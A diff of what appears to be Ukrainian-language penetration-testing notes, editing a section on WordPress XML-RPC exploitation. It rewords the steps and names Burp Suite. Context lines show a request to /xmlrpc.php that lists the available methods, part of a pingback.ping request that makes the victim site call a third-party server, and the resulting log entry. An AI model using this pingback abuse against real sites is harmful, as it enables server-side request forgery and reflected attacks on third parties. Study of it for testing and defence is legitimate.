@@ -59,7 +59,8 @@ FILES
 @@@@@@@@@@@@@@@@@@@@@@
 XML-RPC EXPLOITATION
 @@@@@@@@@@@@@@@@@@@@@@
-Відправляє пост-запит:
+Відправляємо через burpsuite запит:
+
 POST /xmlrpc.php HTTP/1.1
 Host: example.com
 Content-Length: 135
@@ -72,7 +73,7 @@ Content-Length: 135
 
 Сервер успішно приймає і у відповідь надає перелік публічнодоступних функцій XML-RPС, до яких можна стукати. Серед них pingback.ping – це функція WordPress, яка сповіщає інші сайти через HTTP-запити про нові публікації.
 
-Проводимо пінгбек-атаку, виконуємо запит до стороннього сервера від імені WordPress жертви:
+Проводимо пінгбек-атаку, виконуємо запит до стороннього сервера/сайту від імені WordPress жертви:
 
 POST /xmlrpc.php HTTP/1.1
 Host: example.com
@@ -99,7 +100,7 @@ Content-Length: 336
 </params>
 </methodCall>
 
-У лог стороннього сайту у логах буде:
+У логах стороннього сайту з'явиться:
 
 XX.XX.XXX.XXX - - [20/Jul/2023:14:10:42 +0000] "GET /post/
 HTTP/2" 200 12704 "https://target-site/post/" "WordPress/5.7.2;
@@ -107,4 +108,3 @@ http://[domain]; verifying pingback from XX.XXX.XX.XX" "target-
 site"
 
 Таким чином можна маніпуляти цим.
-
